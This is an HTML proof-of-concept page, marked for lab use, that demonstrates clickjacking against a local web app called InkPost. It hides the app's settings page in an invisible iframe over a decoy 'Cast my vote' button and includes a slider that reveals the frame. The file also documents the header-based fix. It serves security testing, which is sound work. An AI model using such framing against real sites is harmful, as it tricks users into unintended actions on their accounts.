<!doctype html>
<!--
  VULN-5 PoC — Clickjacking. LAB USE ONLY.

  1. Log in to InkPost at http://localhost:5000.
  2. cd poc && python -m http.server 8000
  3. Open http://localhost:8000/evil_frame.html

  The InkPost settings page is loaded in an invisible iframe on top of a decoy
  button. Use the slider to reveal the frame. After FIX-5 the browser refuses
  to render the frame (X-Frame-Options: DENY / frame-ancestors 'none') and the
  console shows the blocked-framing error.
-->
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Vote for Society of the Year</title>
  <style>
    body { font-family: system-ui, sans-serif; margin: 0; background: #f0f9ff; }
    header { padding: 20px 24px; background: #0369a1; color: white; }
    .controls { padding: 12px 24px; background: #e0f2fe; font-size: 14px; }
    .stage { position: relative; width: 820px; height: 1100px; margin: 24px; }
    .decoy {
      position: absolute; top: 210px; left: 40px; z-index: 1;
      padding: 18px 28px; font-size: 20px; border-radius: 12px; border: none;
      background: #16a34a; color: white; cursor: pointer;
    }
    iframe { position: absolute; inset: 0; width: 820px; height: 1100px; border: 2px dashed #ef4444; z-index: 2; opacity: 0; }
  </style>
</head>
<body>
  <header><h1>Society of the Year 2026</h1></header>
  <div class="controls">
    Frame opacity: <input id="op" type="range" min="0" max="100" value="0">
    <span id="opv">0%</span> — drag right to reveal the hidden InkPost page.
  </div>
  <div class="stage">
    <button class="decoy">✔ Cast my vote</button>
    <iframe id="victim" src="http://localhost:5000/settings" title="victim"></iframe>
  </div>
  <script>
    var op = document.getElementById("op"), opv = document.getElementById("opv"), fr = document.getElementById("victim");
    op.addEventListener("input", function () { fr.style.opacity = op.value / 100; opv.textContent = op.value + "%"; });
  </script>
</body>
</html>
